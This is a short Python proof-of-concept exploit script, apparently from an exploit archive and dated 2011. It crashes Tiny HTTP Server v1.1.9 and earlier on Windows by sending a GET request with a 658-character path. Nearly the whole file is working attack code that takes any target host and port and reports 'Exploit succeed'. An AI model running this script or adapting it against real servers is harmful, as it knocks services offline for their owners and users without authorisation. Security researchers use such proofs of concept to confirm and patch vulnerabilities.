#!/usr/bin/python

# Tiny HTTP Server <=v1.1.9 Remote Crash PoC
# written by localh0t
# Date: 24/02/11
# Contact: mattdch0@gmail.com
# Follow: @mattdch
# www.localh0t.com.ar
# Targets: Windows (All)

import httplib,sys

if (len(sys.argv) < 3):
	print "\nTiny HTTP Server <=v1.1.9 Remote Crash PoC"
        print "\n	Usage: %s <host> <port> \n" %(sys.argv[0])
	sys.exit()

payload = "X" * 658

try:
	print "\n[!] Connecting to %s ..." %(sys.argv[1])
	httpServ = httplib.HTTPConnection(sys.argv[1] , int(sys.argv[2]))
	httpServ.connect()
	print "[!] Sending payload..."
	httpServ.request('GET', "/" + str(payload))
	print "[!] Exploit succeed. Check %s if crashed.\n" %(sys.argv[1])
except:
	print "[-] Connection error, exiting..."

httpServ.close()
sys.exit()